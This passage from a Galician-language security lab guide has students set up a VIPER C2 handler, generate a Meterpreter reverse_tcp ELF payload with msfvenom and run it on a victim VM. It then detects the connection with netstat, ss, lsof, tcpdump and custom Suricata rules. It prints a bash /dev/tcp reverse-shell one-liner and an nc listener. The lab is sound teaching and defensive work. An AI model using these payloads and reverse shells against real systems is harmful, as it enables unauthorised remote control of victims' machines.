<img alt="Fig. 1: docker-compose up" src="../images/docker-compose-up-viper.png" /></p>
</li>
<li>
<p>Acceder á interface de Viper 
<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># O porto por defecto adoita ser 60000 ou similar. Verifica a documentación de VIPER ou os logs de docker.</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>firefox<span class="w"> </span>https://localhost:60000<span class="w"> </span><span class="c1"># Ou a IP do servidor VIPER</span>
</span></code></pre></div></p>
</li>
<li>
<p>Login<br />
Username: <strong>root</strong><br />
Password: <strong>abc123.</strong> (ou o que configuraches)<br />
<img alt="Fig. 2: Login" src="../images/login.png" /></p>
</li>
</ol>
<div class="admonition info">
<p class="admonition-title">Dende o Dashboard podes xestionar os ataques.</p>
<p>Hai que ter en conta que cando accedemos ao dashboard atoparemos 2 máquinas existentes na base de datos do propio VIPER, as cales poderemos eliminar, aínda que se aparecen non afectan ao desenvolvemento desta práctica.</p>
</div>
<hr />
<h2 id="exemplos-practicos"><strong>Exemplos Prácticos</strong></h2>
<h3 id="exemplo-1-reverse-shell"><strong>Exemplo 1: <a href="https://www.revshells.com/" target="_blank">Reverse Shell</a></strong></h3>
<!--
<pre class="mermaid"><code>graph TD;
    subgraph "Rede Virtual"
        A[VM Atacante Debian 12 Viper C2 Server];
        B[VM Vítima Debian 12];
    end

    B -- "(1) Payload" --&gt; A;
    A -- "(2) Envío de Comandos" --&gt; B;
    B -- "(3) Devolución de Resultados" --&gt; A;

    style A fill:yellow,stroke:#333,stroke-width:2px;
    style B fill:red,stroke:#333,stroke-width:2px;</code></pre>
-->

<p><img alt="viper - Exemplo1" src="../images/viper-exemplo1.png" width="70%" /></p>
<h4 id="escenario-resumido"><strong>Escenario Resumido</strong></h4>
<ul>
<li><strong><code>VM-1</code> (VIPER)</strong>: <code>192.168.120.100</code> (Centro de control, onde está VIPER con <code>msfconsole</code>).</li>
<li><strong><code>VM-2</code> (Debian con payload activo)</strong>: <code>192.168.120.101</code> (Acceso logrado dende <code>VM-1</code> a través dun <code>Meterpreter</code> activo).</li>
</ul>
<div class="admonition note">
<p class="admonition-title"><strong>Reverse TCP e Reverse Shell</strong></p>
<p><strong>Reverse TCP</strong>:<br />
Unha conexión Reverse TCP é un método no que un sistema comprometido establece unha conexión de saída cara a un servidor remoto (como o servidor C2 configurado con VIPER ou Metasploit).</p>
<ul>
<li>
<p>Obxectivo: Establecer unha comunicación entre o sistema comprometido e o servidor atacante.</p>
</li>
<li>
<p>Quen inicia a conexión?: O sistema comprometido.</p>
</li>
<li>
<p>Protocolo utilizado: Normalmente TCP, pero tamén pode ser HTTP, HTTPS, etc.</p>
</li>
<li>
<p>Uso habitual: Comunicación encuberta entre a vítima e o atacante.</p>
</li>
<li>
<p>Exemplo:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x86/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.146.10<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>&gt;<span class="w"> </span>reverse_tcp.elf
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>./reverse_tcp.elf<span class="w">  </span><span class="c1"># Executado na máquina comprometida.</span>
</span></code></pre></div></p>
</li>
</ul>
<p><strong>Reverse Shell</strong>:<br />
Unha Reverse Shell é un tipo específico de conexión Reverse TCP onde o atacante obtén acceso a un shell remoto no sistema comprometido.</p>
<ul>
<li>Exemplo de Reverse Shell (simple) con nc:<ul>
<li>Na máquina atacante (servidor VIPER ou Metasploit):
<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
</span></code></pre></div></li>
<li>Na máquina comprometida:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/192.168.146.10/4444<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
</span></code></pre></div></li>
<li>Resultado: O atacante recibe un shell interactivo desde a máquina comprometida.</li>
</ul>
</li>
</ul>
</div>
<h4 id="vm-1-atacante-viper_1">VM-1 Atacante: VIPER</h4>
<ol>
<li>
<p><strong>Crear un <code>Handler</code> en VIPER:</strong></p>
<div class="admonition info">
<p class="admonition-title">Que é un handler en seguridade ofensiva?</p>
<p>Un <strong>handler</strong> é un compoñente que <strong>escoita e acepta conexións de volta desde un payload executado nunha máquina vítima</strong>. Actúa como servidor receptor para establecer sesións remotas cando se usa un <code>reverse_shell</code> ou outro tipo de carga útil.</p>
<p>Os handlers son fundamentais en frameworks como <strong>Metasploit</strong>, onde se configuran (ex: <code>exploit/multi/handler</code>) para recibir sesións de Meterpreter, shell inversas, etc.</p>
<p>Exemplo típico de uso:</p>
<ul>
<li>Configurar o handler con IP/porto local.</li>
<li>Executar un payload que se conecta de volta.</li>
<li>Cando a vítima executa o payload, o handler "captura" a sesión.</li>
</ul>
<p>Sen un handler activo, as conexións de volta non se recibirían, e o acceso remoto non sería posible.</p>
</div>
<ul>
<li>No Dashboard de VIPER, vai á sección de <code>Handler&amp;Payload</code>.</li>
<li>Crea un novo handler, por exemplo, <code>linux/x64/meterpreter/reverse_tcp</code> ou <code>windows/x64/meterpreter/reverse_tcp</code> dependendo do obxectivo.</li>
<li>Configura <code>LHOST</code> coa IP do servidor VIPER (a máquina onde corre Docker) e <code>LPORT</code> (p.ex., 4444).<br />
<img alt="Fig. 3: Add Handler" src="../images/add-handler.png" />
<img alt="Fig. 4: linux/x64/meterpreter_reverse_tcp" src="../images/add-handler-2.png" />
<em>Sustituír <code>&lt;IP_SERVIDOR_C2&gt;</code> pola IP de Viper.</em>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># Exemplo para obter a IP</span>
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>$<span class="w"> </span><span class="nv">IP_SERVIDOR_C2</span><span class="o">=</span><span class="k">$(</span>hostname<span class="w"> </span>-I<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">&#39; &#39;</span><span class="w"> </span>-f2<span class="k">)</span>
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$IP_SERVIDOR_C2</span>
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="m">192</span>.168.120.100<span class="w"> </span><span class="c1"># Exemplo</span>
</span></code></pre></div></li>
</ul>
</li>
<li>
<p><strong>Xerar o <code>Payload</code>:</strong></p>
<ul>
<li>Na sección de <code>Generate Payload</code>, selecciona o handler creado.</li>
<li>Elixe o formato do payload (p.ex., <code>elf</code> para Linux, <code>exe</code> para Windows).</li>
<li>Descarga o payload xerado.<br />
<img alt="Fig. 5: Generate Payload" src="../images/add-handler-3v2.png" />
<img alt="Fig. 6: elf" src="../images/add-handler-4.png" width="50%" />
<img alt="Fig. 7: elf descargado" src="../images/add-handler-5v2.png" /></li>
</ul>
</li>
</ol>
<h4 id="vm-2-maquina-vitima">VM-2 Máquina Vítima</h4>
<ol>
<li><strong>Comprometer a Máquina Vítima (VM-2 nodo Debian):</strong><ul>
<li>Transfire o payload á máquina vítima (simulando phishing, descarga web, USB, etc.).</li>
<li>Executa o payload na máquina vítima.
<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># Na máquina vítima Linux (exemplo)</span>
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>$<span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>payload_descargado.elf
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>$<span class="w"> </span>./payload_descargado.elf
</span></code></pre></div>
<img alt="Fig. 8: permisos e execución" src="../images/add-handler-6v2.png" /></li>
</ul>
</li>
</ol>
<div class="admonition warning">
<p class="admonition-title">Tempo execución payload: 30 minutos</p>
<p>Ver <a href="https://www.viperrtp.com/pricing" target="_blank">VIPER Pricing</a><br />
Unha das <strong>limitacións</strong> que posúe a <strong>versión COMMUNITY</strong> que estamos a empregar é que cada <strong>sesión establecida</strong> coa máquina vítima ten unha <strong>limitación de 30 minutos</strong>.<br />
<strong>Polo tanto isto hai que telo en conta para a realización desta práctica xa que pode ser que a conexión córtese e haxa que crear outra, cambiando así os PIDs dos procesos executados e os portos da conexión establecida.</strong></p>
</div>
<h4 id="vm-1-atacante-viper_2">VM-1 Atacante: VIPER</h4>
<ol>
<li>
<p><strong>Obter Remote Shell en VIPER:</strong></p>
<ul>
<li>No Dashboard de VIPER, deberías ver unha nova sesión (axente) conectada desde a máquina vítima (premer nos segundos de conexión establecidos).<br />
<img alt="Fig. 9: Remote Shell" src="../images/add-handler-7v2.png" />
<img alt="Fig. 10: Ver conexión Remote Shell" src="../images/add-handler-7v3.png" /></li>
</ul>
</li>
<li>
<p><strong>Execución de comandos na máquina comprometida:</strong></p>
<ul>
<li>Interactúa coa sesión para executar comandos (clic botón dereito do rato onde aparecen as IPs da máquina viper e da comprometida).<br />
<img alt="Fig. 11: Execución shell" src="../images/add-handler-7.png" />
<img alt="Fig. 12: Execución comandos" src="../images/add-handler-8v2.png" />
<img alt="Fig. 13: Nova sesión activa en VIPER" src="../images/add-handler-9v2.png" />
<img alt="Fig. 14: Pivot Graph" src="../images/pivot-graph.png" /></li>
</ul>
</li>
</ol>
<h4 id="vm-2-maquina-vitima_1">VM-2 Máquina vítima</h4>
<h5 id="monitorizacion-detectar-reverse-tcp-desde-debian-12">Monitorización: Detectar Reverse TCP desde Debian 12</h5>
<!--6.  **Contramedidas Propostas (Blue Team) para Reverse Shell:**-->

<p><strong>1. Monitorización de Conexións Activas</strong></p>
<p>Verifica se o nodo Debian 12 está establecendo conexións sospeitosas.<br />
Busca conexións establecidas con enderezos IP que non deberían estar presentes (como a IP do teu servidor VIPER).</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># apt update &amp;&amp; apt -y install net-tools</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="c1"># netstat -natp | grep ESTAB</span>
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">192</span>.168.120.101:38396<span class="w">   </span><span class="m">192</span>.168.120.100:4444<span class="w">    </span>ESTABLISHED<span class="w"> </span><span class="m">2048</span>/./1743838036.
</span></code></pre></div>
<p>Ou usando <code>ss</code> que é máis moderno:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># ss -natp | grep ESTAB</span>
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>ESTAB<span class="w">     </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w">      </span><span class="m">192</span>.168.120.101:38396<span class="w"> </span><span class="m">192</span>.168.120.100:4444<span class="w"> </span>users:<span class="o">((</span><span class="s2">&quot;1743838036.elf&quot;</span>,pid<span class="o">=</span><span class="m">2048</span>,fd<span class="o">=</span><span class="m">5</span><span class="o">))</span>
</span></code></pre></div>
<p><strong>2. Monitorización de Procesos en Execución</strong></p>
<p>Comproba cales procesos están escoitando en portos específicos. E sobre todo, as conexións establecidas.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># lsof -i -P -n | grep ESTAB</span>
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="m">174383803</span><span class="w"> </span><span class="m">2048</span><span class="w">      </span>losada<span class="w">    </span>5u<span class="w">  </span>IPv4<span class="w">  </span><span class="m">22266</span><span class="w">      </span>0t0<span class="w">  </span>TCP<span class="w"> </span><span class="m">192</span>.168.120.101:38396-&gt;192.168.120.100:4444<span class="w"> </span><span class="o">(</span>ESTABLISHED<span class="o">)</span>
</span></code></pre></div>
<p><strong>3. Uso de Ferramentas de Bastionado (IDS/IPS)</strong></p>
<p>Instala un sistema de detección de intrusións (IDS) para monitorizar o tráfico de rede.</p>
<p><strong>Ferramentas Recomendadas:</strong><br />
- <strong>Suricata:</strong> IDS/IPS avanzado que detecta tráfico sospeitoso.<br />
- <strong>Zeek (antigo Bro):</strong> Monitoriza a rede e rexistra eventos anómalos.<br />
- <strong>Snort:</strong> IDS popular que permite crear regras personalizadas.  </p>
<p><span style="color: blue;"><strong><a href="../suricata/" target="_blank">Suricata</a></strong></span>  </p>
<div style="margin-top:-40px;margin-bottom:-20px;">

&nbsp;

</div>

<ul>
<li>
<p><strong>Configuración básica:</strong>
    <div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># apt install suricata -y</span>
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="c1"># suricata-update</span>
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="c1"># ls /var/lib/suricata/rules/</span>
</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="c1"># sed -E -i &#39;s|(default-rule-path:).*|\1 /var/lib/suricata/rules|&#39; /etc/suricata/suricata.yaml</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>Execución:</strong>
    <div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># suricata -c /etc/suricata/suricata.yaml -i enp0s8</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>Logs:</strong>
    Executar noutra consola de <code>root</code>:<br />
    <div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># tail -f /var/log/suricata/fast.log</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>Xerar novas regras para o porto TCP 4444</strong>
    <div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1"># echo &#39;# Detectar Reverse Shell mediante conexión TCP a un porto típico (Metasploit, VIPER, etc.)</span>
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>alert<span class="w"> </span>tcp<span class="w"> </span>any<span class="w"> </span>any<span class="w"> </span>-&gt;<span class="w"> </span>any<span class="w"> </span><span class="m">4444</span><span class="w"> </span><span class="o">(</span>msg:<span class="s2">&quot;Reverse TCP Detected - Possible Metasploit/VIPER&quot;</span><span class="p">;</span><span class="w"> </span>sid:1000001<span class="p">;</span><span class="w"> </span>rev:1<span class="p">;</span><span class="w"> </span>classtype:trojan-activity<span class="p">;</span><span class="w"> </span>priority:1<span class="p">;</span><span class="o">)</span>
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="c1"># Detectar Reverse Shell mediante conexión a porto alto común (60000)</span>
</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>alert<span class="w"> </span>tcp<span class="w"> </span>any<span class="w"> </span>any<span class="w"> </span>-&gt;<span class="w"> </span>any<span class="w"> </span><span class="m">60000</span><span class="w"> </span><span class="o">(</span>msg:<span class="s2">&quot;Reverse TCP Detected - Possible VIPER Connection&quot;</span><span class="p">;</span><span class="w"> </span>sid:1000002<span class="p">;</span><span class="w"> </span>rev:1<span class="p">;</span><span class="w"> </span>classtype:trojan-activity<span class="p">;</span><span class="w"> </span>priority:1<span class="p">;</span><span class="o">)</span>
</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>
</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="c1"># Detectar Reverse Shell mediante HTTP (Metasploit ou VIPER vía HTTP)</span>
</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>alert<span class="w"> </span>http<span class="w"> </span>any<span class="w"> </span>any<span class="w"> </span>-&gt;<span class="w"> </span>any<span class="w"> </span>any<span class="w"> </span><span class="o">(</span>msg:<span class="s2">&quot;Suspicious HTTP Traffic - Possible Reverse Shell&quot;</span><span class="p">;</span><span class="w"> </span>content:<span class="s2">&quot;POST&quot;</span><span class="p">;</span><span class="w"> </span>http_method<span class="p">;</span><span class="w"> </span>sid:1000003<span class="p">;</span><span class="w"> </span>rev:1<span class="p">;</span><span class="w"> </span>classtype:trojan-activity<span class="p">;</span><span class="w"> </span>priority:1<span class="p">;</span><span class="o">)</span>
</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>
</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="c1"># Detectar Reverse Shell mediante HTTPS (Comunicacións cifradas)</span>
</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a>alert<span class="w"> </span>tls<span class="w"> </span>any<span class="w"> </span>any<span class="w"> </span>-&gt;<span class="w"> </span>any<span class="w"> </span>any<span class="w"> </span><span class="o">(</span>msg:<span class="s2">&quot;Suspicious HTTPS Traffic - Possible Reverse Shell&quot;</span><span class="p">;</span><span class="w"> </span>sid:1000004<span class="p">;</span><span class="w"> </span>rev:1<span class="p">;</span><span class="w"> </span>classtype:trojan-activity<span class="p">;</span><span class="w"> </span>priority:1<span class="p">;</span><span class="o">)</span><span class="err">&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/var/lib/suricata/rules/local.rules
</span></code></pre></div></p>
</li>
<li>
<p><strong>Configurar para cargar as regras</strong>
    <div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1"># sed -i &#39;/rule-files:/a\  - local.rules&#39; /etc/suricata/suricata.yaml</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>Reiniciar suricata para aplicar os cambios</strong>
    <div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c1"># systemctl restart suricata || suricata -c /etc/suricata/suricata.yaml -i enp0s8</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>Revisar de novo os Logs:</strong>
    Executar noutra consola de <code>root</code>:<br />
    <div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c1"># tail -f /var/log/suricata/fast.log</span>
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="m">04</span>/04/2025-01:47:35.393635<span class="w">  </span><span class="o">[</span>**<span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="m">1</span>:1000001:1<span class="o">]</span><span class="w"> </span>Reverse<span class="w"> </span>TCP<span class="w"> </span>Detected<span class="w"> </span>-<span class="w"> </span>Possible<span class="w"> </span>Metasploit/VIPER<span class="w"> </span><span class="o">[</span>**<span class="o">]</span><span class="w"> </span><span class="o">[</span>Classification:<span class="w"> </span>A<span class="w"> </span>Network<span class="w"> </span>Trojan<span class="w"> </span>was<span class="w"> </span>detected<span class="o">]</span><span class="w"> </span><span class="o">[</span>Priority:<span class="w"> </span><span class="m">1</span><span class="o">]</span><span class="w"> </span><span class="o">{</span>TCP<span class="o">}</span><span class="w"> </span><span class="m">192</span>.168.120.101:47226<span class="w"> </span>-&gt;<span class="w"> </span><span class="m">192</span>.168.120.100:4444
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="m">04</span>/04/2025-01:47:36.609417<span class="w">  </span><span class="o">[</span>**<span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="m">1</span>:1000001:1<span class="o">]</span><span class="w"> </span>Reverse<span class="w"> </span>TCP<span class="w"> </span>Detected<span class="w"> </span>-<span class="w"> </span>Possible<span class="w"> </span>Metasploit/VIPER<span class="w"> </span><span class="o">[</span>**<span class="o">]</span><span class="w"> </span><span class="o">[</span>Classification:<span class="w"> </span>A<span class="w"> </span>Network<span class="w"> </span>Trojan<span class="w"> </span>was<span class="w"> </span>detected<span class="o">]</span><span class="w"> </span><span class="o">[</span>Priority:<span class="w"> </span><span class="m">1</span><span class="o">]</span><span class="w"> </span><span class="o">{</span>TCP<span class="o">}</span><span class="w"> </span><span class="m">192</span>.168.120.101:44780<span class="w"> </span>-&gt;<span class="w"> </span><span class="m">192</span>.168.120.100:4444
</span></code></pre></div></p>
</li>
</ul>
<p><strong>4. Monitorización do Tráfico de Rede</strong></p>
<p>Se queres analizar o tráfico específico xerado polo reverse TCP, podes usar:<br />
   <div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c1"># tcpdump -i enp0s8 port 4444  </span>
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>tcpdump:<span class="w"> </span>verbose<span class="w"> </span>output<span class="w"> </span>suppressed,<span class="w"> </span>use<span class="w"> </span>-v<span class="o">[</span>v<span class="o">]</span>...<span class="w"> </span><span class="k">for</span><span class="w"> </span>full<span class="w"> </span>protocol<span class="w"> </span>decode
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>listening<span class="w"> </span>on<span class="w"> </span>enp0s8,<span class="w"> </span>link-type<span class="w"> </span>EN10MB<span class="w"> </span><span class="o">(</span>Ethernet<span class="o">)</span>,<span class="w"> </span>snapshot<span class="w"> </span>length<span class="w"> </span><span class="m">262144</span><span class="w"> </span>bytes
</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="m">01</span>:13:13.153147<span class="w"> </span>IP<span class="w"> </span><span class="m">192</span>.168.120.101.41552<span class="w"> </span>&gt;<span class="w"> </span><span class="m">192</span>.168.120.100.4444:<span class="w"> </span>Flags<span class="w"> </span><span class="o">[</span>S<span class="o">]</span>,<span class="w"> </span>seq<span class="w"> </span><span class="m">473515495</span>,<span class="w"> </span>win<span class="w"> </span><span class="m">64240</span>,<span class="w"> </span>options<span class="w"> </span><span class="o">[</span>mss<span class="w"> </span><span class="m">1460</span>,sackOK,TS<span class="w"> </span>val<span class="w"> </span><span class="m">2501481294</span><span class="w"> </span>ecr<span class="w"> </span><span class="m">0</span>,nop,wscale<span class="w"> </span><span class="m">7</span><span class="o">]</span>,<span class="w"> </span>length<span class="w"> </span><span class="m">0</span>
</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="m">01</span>:13:13.154046<span class="w"> </span>IP<span class="w"> </span><span class="m">192</span>.168.120.100.4444<span class="w"> </span>&gt;<span class="w"> </span><span class="m">192</span>.168.120.101.41552:<span class="w"> </span>Flags<span class="w"> </span><span class="o">[</span>S.<span class="o">]</span>,<span class="w"> </span>seq<span class="w"> </span><span class="m">9365323</span>,<span class="w"> </span>ack<span class="w"> </span><span class="m">473515496</span>,<span class="w"> </span>win<span class="w"> </span><span class="m">65160</span>,<span class="w"> </span>options<span class="w"> </span><span class="o">[</span>mss<span class="w"> </span><span class="m">1460</span>,sackOK,TS<span class="w"> </span>val<span class="w"> </span><span class="m">826785556</span><span class="w"> </span>ecr<span class="w"> </span><span class="m">2501481294</span>,nop,wscale<span class="w"> </span><span class="m">7</span><span class="o">]</span>,<span class="w"> </span>length<span class="w"> </span><span class="m">0</span>
</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="m">01</span>:13:13.154096<span class="w"> </span>IP<span class="w"> </span><span class="m">192</span>.168.120.101.41552<span class="w"> </span>&gt;<span class="w"> </span><span class="m">192</span>.168.120.100.4444:<span class="w"> </span>Flags<span class="w"> </span><span class="o">[</span>.<span class="o">]</span>,<span class="w"> </span>ack<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>win<span class="w"> </span><span class="m">502</span>,<span class="w"> </span>options<span class="w"> </span><span class="o">[</span>nop,nop,TS<span class="w"> </span>val<span class="w"> </span><span class="m">2501481295</span><span class="w"> </span>ecr<span class="w"> </span><span class="m">826785556</span><span class="o">]</span>,<span class="w"> </span>length<span class="w"> </span><span class="m">0</span>
</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="m">01</span>:13:13.479097<span class="w"> </span>IP<span class="w"> </span><span class="m">192</span>.168.120.100.4444<span class="w"> </span>&gt;<span class="w"> </span><span class="m">192</span>.168.120.101.41552:<span class="w"> </span>Flags<span class="w"> </span><span class="o">[</span>P.<span class="o">]</span>,<span class="w"> </span>seq<span class="w"> </span><span class="m">1</span>:388,<span class="w"> </span>ack<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>win<span class="w"> </span><span class="m">510</span>,<span class="w"> </span>options<span class="w"> </span><span class="o">[</span>nop,nop,TS<span class="w"> </span>val<span class="w"> </span><span class="m">826785881</span><span class="w"> </span>ecr<span class="w"> </span><span class="m">2501481295</span><span class="o">]</span>,<span class="w"> </span>length<span class="w"> </span><span class="m">387</span>
</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="m">01</span>:13:13.479123<span class="w"> </span>IP<span class="w"> </span><span class="m">192</span>.168.120.101.41552<span class="w"> </span>&gt;<span class="w"> </span><span class="m">192</span>.168.120.100.4444:<span class="w"> </span>Flags<span class="w"> </span><span class="o">[</span>.<span class="o">]</span>,<span class="w"> </span>ack<span class="w"> </span><span class="m">388</span>,<span class="w"> </span>win<span class="w"> </span><span class="m">501</span>,<span class="w"> </span>options<span class="w"> </span><span class="o">[</span>nop,nop,TS<span class="w"> </span>val<span class="w"> </span><span class="m">2501481620</span><span class="w"> </span>ecr<span class="w"> </span><span class="m">826785881</span><span class="o">]</span>,<span class="w"> </span>length<span class="w"> </span><span class="m">0</span>
</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="m">01</span>:13:13.479478<span class="w"> </span>IP<span class="w"> </span><span class="m">192</span>.168.120.101.41552<span class="w"> </span>&gt;<span class="w"> </span><span class="m">192</span>.168.120.100.4444:<span class="w"> </span>Flags<span class="w"> </span><span class="o">[</span>P.<span class="o">]</span>,<span class="w"> </span>seq<span class="w"> </span><span class="m">1</span>:398,<span class="w"> </span>ack<span class="w"> </span><span class="m">388</span>,<span class="w"> </span>win<span class="w"> </span><span class="m">501</span>,<span class="w"> </span>options<span class="w"> </span><span class="o">[</span>nop,nop,TS<span class="w"> </span>val<span class="w"> </span><span class="m">2501481620</span><span class="w"> </span>ecr<span class="w"> </span><span class="m">826785881</span><span class="o">]</span>,<span class="w"> </span>length<span class="w"> </span><span class="m">397</span>
</span></code></pre></div>
   Onde <code>4444</code> é un porto típico usado por Metasploit, pero debes cambialo polo porto que o teu servidor VIPER está usando.  </p>
<div class="admonition tip">
<p class="admonition-title">Consulta repetida cada 5 segundos ao mesmo dominio sospeitoso</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1"># tcpdump -i enp0s8 -n -l port 53</span>
